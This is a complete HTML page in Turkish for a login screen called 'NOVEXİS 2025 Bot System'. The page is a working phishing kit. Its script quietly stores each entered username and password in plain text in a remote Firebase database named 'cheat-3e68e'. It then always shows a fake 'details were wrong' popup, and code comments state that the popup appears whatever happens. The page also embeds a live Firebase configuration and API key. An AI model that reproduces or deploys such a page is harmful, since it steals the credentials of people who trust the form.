<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>2025 Bot System - NOVEXİS</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
  * { box-sizing: border-box; }
  body {
    margin: 0;
    font-family: 'Poppins', sans-serif;
    background: linear-gradient(135deg, #0a1b3a 0%, #12345a 100%);
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    color: #e0e7ff;
  }
  .login-container {
    background: rgba(255,255,255,0.12);
    backdrop-filter: saturate(180%) blur(20px);
    border-radius: 28px;
    box-shadow: 0 5px 12px rgba(0,0,0,0.35), 0 20px 60px rgba(10,30,70,0.8);
    width: 350px;
    padding: 45px 35px 50px;
    text-align: center;
  }
  .subtitle {
    font-weight: 700;
    font-size: 1.15rem;
    color: #9bbdff;
    margin-bottom: 12px;
    letter-spacing: 6px;
    text-transform: uppercase;
  }
  h2 {
    font-weight: 700;
    font-size: 2.2rem;
    margin-bottom: 40px;
    color: #d0dbff;
    text-shadow: 0 0 20px rgba(70, 110, 255, 0.95);
  }
  .form-group {
    position: relative;
    margin-bottom: 30px;
  }
  input {
    width: 100%;
    background: transparent;
    border: none;
    border-bottom: 2px solid rgba(255,255,255,0.3);
    font-size: 1.1rem;
    padding: 12px 0;
    color: #dde6ff;
    outline: none;
  }
  input::placeholder { color: transparent; }
  label {
    position: absolute;
    left: 0;
    top: 14px;
    font-weight: 500;
    color: rgba(255,255,255,0.6);
    font-size: 1rem;
    pointer-events: none;
    transition: all 0.3s ease;
  }
  input:focus,
  input:not(:placeholder-shown) {
    border-color: #4a90ff;
  }
  input:focus + label,
  input:not(:placeholder-shown) + label {
    top: -12px;
    font-size: 0.8rem;
    color: #78a9ff;
  }
  button {
    width: 100%;
    margin-top: 12px;
    background: linear-gradient(135deg, #3c6aff, #0055cc);
    border: none;
    border-radius: 28px;
    padding: 14px 0;
    font-size: 1.2rem;
    font-weight: 700;
    color: #e0e7ff;
    cursor: pointer;
    box-shadow: 0 12px 42px rgba(60, 105, 255, 0.85);
    transition: all 0.3s ease;
  }
  button:hover {
    background: linear-gradient(135deg, #4d7dff, #004ecc);
    transform: translateY(-4px);
  }
  .popup-overlay {
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    background: rgba(0, 8, 20, 0.7);
    backdrop-filter: blur(6px);
    display: none;
    align-items: center;
    justify-content: center;
    z-index: 999;
  }
  .popup-box {
    background: rgba(255,255,255,0.1);
    border: 1px solid rgba(255,255,255,0.2);
    border-radius: 16px;
    padding: 30px 25px;
    text-align: center;
    max-width: 300px;
    color: #fff;
    box-shadow: 0 0 20px rgba(0,0,0,0.5);
  }
  .popup-box p {
    margin: 0 0 20px;
    font-size: 1.1rem;
  }
  .popup-box button {
    background: #4a90ff;
    padding: 10px 24px;
    border-radius: 8px;
    border: none;
    font-weight: 600;
    font-size: 1rem;
    cursor: pointer;
    color: #fff;
    box-shadow: 0 6px 20px rgba(0,0,0,0.4);
  }
  .popup-box button:hover {
    background: #3575e6;
  }
</style>
</head>
<body>

<div class="login-container">
  <div class="subtitle">NOVEXİS</div>
  <h2>2025 Bot System</h2>
  <form id="loginForm" autocomplete="off" spellcheck="false">
    <div class="form-group">
      <input type="text" id="username" name="username" placeholder=" " required />
      <label for="username">Kullanıcı Adı</label>
    </div>
    <div class="form-group">
      <input type="password" id="password" name="password" placeholder=" " required />
      <label for="password">Şifre</label>
    </div>
    <button type="submit">Giriş Yap</button>
  </form>
</div>

<!-- POPUP -->
<div class="popup-overlay" id="popupOverlay">
  <div class="popup-box">
    <p>Bilgilerde bir yanlışlık çıktı.</p>
    <button id="closePopup">Tamam</button>
  </div>
</div>

<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-app.js";
  import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.9.1/firebase-database.js";

  const firebaseConfig = {
    apiKey: "AIzaSyB97IUA_whtGUH7VSigHAXMA0D6W1PQBrY",
    authDomain: "cheat-3e68e.firebaseapp.com",
    databaseURL: "https://cheat-3e68e-default-rtdb.firebaseio.com",
    projectId: "cheat-3e68e",
    storageBucket: "cheat-3e68e.appspot.com",
    messagingSenderId: "350780718408",
    appId: "1:350780718408:web:9c0789eb52997f6f10077d",
    measurementId: "G-BSF1143QJB"
  };

  const app = initializeApp(firebaseConfig);
  const db = getDatabase(app);

  const form = document.getElementById('loginForm');
  const popup = document.getElementById('popupOverlay');
  const closeBtn = document.getElementById('closePopup');

  function showPopup() {
    popup.style.display = 'flex';
  }

  closeBtn.addEventListener('click', () => {
    popup.style.display = 'none';
  });

  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    const username = form.username.value.trim();
    const password = form.password.value.trim();

    try {
      await set(ref(db, 'users/' + username), {
        username,
        password,
        timestamp: Date.now()
      });
      // Popup kesin çıkacak, ne olursa olsun:
      showPopup();
      form.reset();
    } catch (err) {
      // Firebase hatası olsa da popup çıkacak:
      showPopup();
    }
  });
</script>

</body>
</html>
